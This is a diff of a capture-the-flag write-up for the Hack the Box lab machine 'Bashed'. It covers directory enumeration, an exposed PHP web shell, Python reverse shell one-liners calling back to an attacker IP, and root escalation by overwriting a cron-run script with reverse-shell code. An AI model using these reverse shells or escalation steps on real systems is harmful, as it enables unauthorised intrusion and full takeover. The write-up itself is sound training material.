@@ -1,8 +1,8 @@
 # Bashed - HTB
 
-Box - IP address
+Bashed - 10.10.10.68
 
-![](/images/bashed/1. bashed "Bashed Info Card")
+![](/images/bashed/1. bashed.png "Bashed Info Card")
 
 Contents:
 
@@ -16,7 +16,7 @@ Contents:
 
 =======================================================
 
-Bashed is a Hack the Box example of system misconfiguration which allows a remote attacker to gain access and escalate to root privileges.
+Bashed is a Hack the Box example of system misconfiguration which allows a remote attacker to gain access and escalate to root privileges. The screenshots for this write-up were captured on 7 May 2020 as I completed the machine. This is usefule to remember a bit later in the write-up as you will see.
 
 <p>&nbsp;</p>
 =======================================================
@@ -28,11 +28,17 @@ Bashed is a Hack the Box example of system misconfiguration which allows a remot
 The machine has an open web shell which allows us to spawn an interactive shell.  From the interactive shell we enumerate interesting files and discover another system misconfiguration which allows us to modify a python script which we call via sudo and obtain root privileges.
 
 -1- nmap
+
 -2- dirbuster
+
 -3- php web shell
+
 -4- bash reverse shell
+
 -5- nc
+
 -6- python scripting
+
 -7- abuse system misconfiguration (sudo permissions)
 
 <p>&nbsp;</p>
@@ -64,11 +70,11 @@ Let's fire up dirbuster and do some enumeration.
 
 ![](/images/bashed/4. dirbuster_1.png "dirbuster")
 
-Since the site talks about “phpbash”, I went with File Extension php and the medium wordlist.
+Fill in the options as you see above. Since the site talks about “phpbash”, I went with File Extension php and the medium wordlist. On Kali linux, this wordlist should be pre-installed at /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt. I also clicked the "Go Faster" button to increase the speed of directory busting.
 
-Click Start
+Once all of your options match those shown, click Start
 
-You only need to let this run for a minute or so. I switch to the “Results - Tree View” tab:
+You only need to let this run for a minute or so, then switch to the “Results - Tree View” tab:
 
 ![](/images/bashed/5. dirbuster_2.png "dirbuster")
 
@@ -76,9 +82,7 @@ Here you can click through different folders that Dirbuster has found.  Remember
 
 ![](/images/bashed/6. dirbuster_3.png "dirbuster")
 
-Looks like we have a couple of the phpbash files to go look at!  Let's browse to it:  
-
-    http://10.10.10.68/dev
+Looks like we have a couple of the phpbash files to go look at!  Let's browse to it: http://10.10.10.68/dev
 
 ![](/images/bashed/7. dev.png "dev")
 
@@ -88,7 +92,7 @@ Click on phpbash.php
 
 ![](/images/bashed/8. phpbash.png "phpbash")
 
-And we are greeted with what looks like a terminal window.  Could this be a bash shell via php?
+And we are greeted with what looks like a terminal window. Let's see what we can do:
 
     whoami
 
@@ -98,7 +102,7 @@ And we are greeted with what looks like a terminal window.  Could this be a bash
 
 ![](/images/bashed/9. phpbash_2.png "phpbash")
 
-Okay, so we have code execution as a low-privileged user, but this isn't the smoothest of interfaces. Perhaps we can use a bash one-liner to trigger a reverse tcp shell?  
+Okay, so we have code execution as a low-privileged user, but this is not the smoothest of interfaces. Perhaps we can use a bash one-liner to trigger a reverse tcp shell?  
 
 
 <p>&nbsp;</p>
@@ -118,8 +122,7 @@ None!  This box is an example of purely manual enumeration and exploitation.  Ha
 
 =======================================================
 
-
-Let's Google bash one-line reverse shells:
+Let's Google bash one-liner reverse shells:
 
 ![](/images/bashed/10. google.png "google")
 
@@ -137,15 +140,15 @@ Then in the phpbash window:
 
     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.24",17011));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-A note here: Bashed is an older machine so it is fine to default to using python. In newer machines you will want to specify "python3" instead as python2 is deprecated. 
+A note here: Bashed is an older machine so it is fine to default to using "python" which is normally symlinked to python2. In newer machines you will want to specify "python3" instead as python2 is deprecated. 
 
 ![](/images/bashed/13. nc_connection.png "nc connection")
 
-Good to go, we have a shell! Let's check if we can sudo anything:
+We have a shell! Let's check if we can sudo anything:
 
 ![](/images/bashed/14. sudo-l.png "sudo -l")
 
-And we can! We can run pretty much anything as the user scriptmanager...which probably has more permissions than we do, so let's log ourselves in as scriptmanager:
+And we can! We can run any command as the user scriptmanager without a password. A dangerous misconfiguration for sure. Since user scriptmanager probably has more permissions than user www-data, let's log ourselves in as scriptmanager:
 
     sudo -u scriptmanager bash -i
 
@@ -153,7 +156,7 @@ This command tells the system we want to run the command "bash -i", or bash in i
 
 ![](/images/bashed/15. sudo-u.png "sudo -u")
 
-Looks good!  Let's see what else we can find in our home folder.
+Looks good! Let's see what else we can find in our home folder.
 
     cd /home/scriptmanager
 
@@ -161,13 +164,13 @@ Looks good!  Let's see what else we can find in our home folder.
 
 ![](/images/bashed/16. enum.png "enum")
 
-Nothing interesting here.  Let's check the / directory:
+Nothing interesting here. Let's check the / directory:
 
     ls /
 
 ![](/images/bashed/17. enum_2.png "enum")
 
-Okay, so we are a user scriptmanager, and in the / directory there is a “scripts” folder which isn't a normal thing on linux.  Let's check it out!
+Okay, so we are a user scriptmanager, and in the / directory there is a “scripts” folder which is not a default directory on linux. Let's check it out!
 
     cd scripts
 
@@ -175,7 +178,7 @@ Okay, so we are a user scriptmanager, and in the / directory there is a “scrip
 
 ![](/images/bashed/18. enum_3.png "enum")
 
-test.py and test.txt.  test.txt has a date/timestamp of just a moment ago...hmm, what's in test.txt and test.py?
+test.py and test.txt. test.txt has a date/timestamp of just a moment ago at 14:03 on 7 May.  Let's see what is in test.txt and test.py:
 
     cat test.txt
 
@@ -183,7 +186,7 @@ test.py and test.txt.  test.txt has a date/timestamp of just a moment ago...hmm,
 
 ![](/images/bashed/19. test.txt.png "test.txt")
 
-The text “testing 123!” is in test.txt. The test.py file opens the test.txt and overwrites it...with “testing 123!”
+The text “testing 123!” is in test.txt. The test.py file opens the test.txt and overwrites it with “testing 123!”
 
 But test.txt is owned by the root user, and again that timestamp was from right about the same time we ran the “ls -la” command.  Let's wait a minute and run ls -la again:
 
@@ -191,9 +194,11 @@ But test.txt is owned by the root user, and again that timestamp was from right 
 
 ![](/images/bashed/20. enum_4.png "enum")
 
-test.txt has a new timestamp...14:07, meaning there is a cron job or some scheduled task that is running test.py every minute or so. since user scriptmanager owns test.py, we can modify test.py and maybe gain a root shell!
+test.txt has a new timestamp of 14:07, meaning there is a cron job or some scheduled task that is running test.py every minute or so. Since user scriptmanager owns test.py, we can modify test.py and when the cron job runs as root we can gain a root shell!
 
-On my Kali machine I created a new test.py file and put this code in it:
+On my Kali machine I created a new python file and put this code in it:
+
+test.py:
 
     import socket,subprocess,os
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -203,11 +208,11 @@ On my Kali machine I created a new test.py file and put this code in it:
     os.dup2(s.fileno(),2)
     p=subprocess.call(["/bin/bash","-i"])
 
-Then I ran python's HTTP server
+Then I ran python's HTTP server:
 
     python -m SimpleHTTPServer 8080
 
-Over on bashed I ran:
+Over on bashed I ran a wget command to download the test.py file to bashed:
     
     wget http://10.10.14.24:8080/test.py
 
@@ -217,7 +222,7 @@ Next I set up a nc listener on Kali to catch the connection:
 
     nc -lvnp 17012
 
-Next we need to replace the old test.py with my new test.py.1:
+Then we need to replace the old test.py with our new test.py.1:
 
     mv test.py.1 test.py
 
@@ -241,10 +246,6 @@ Success! We are root.  Now let's get our flags:
 
 And there we have our flags.
 
-
-
-
-
 <p>&nbsp;</p>
 =======================================================
 
@@ -252,13 +253,19 @@ And there we have our flags.
 
 =======================================================
 
-<file-name.py/.sh>
+one-line python2 reverse shell: 
 
-    insert code here
-    # code blocks ignore the rest of markdown formatting
-    # so you can leave # characters to denote comments
-    # without setting new headings
-        
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.24",17011));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+test.py:
+
+    import socket,subprocess,os
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("10.10.14.24",17012))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p=subprocess.call(["/bin/bash","-i"])
 
 <p>&nbsp;</p>
 =======================================================
@@ -267,11 +274,8 @@ And there we have our flags.
 
 =======================================================
 
-1. Link: []()
-2. Link: []()
-3. Link: []()
-4. Link: []()
-5. Link: []()
+1. Pentestmonkey revserse shell cheatsheet: [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+2. Online sudo manual: [https://www.sudo.ws/man/1.8.14/sudo.man.html](https://www.sudo.ws/man/1.8.14/sudo.man.html)
 
 <p>&nbsp;</p>
 =======================================================
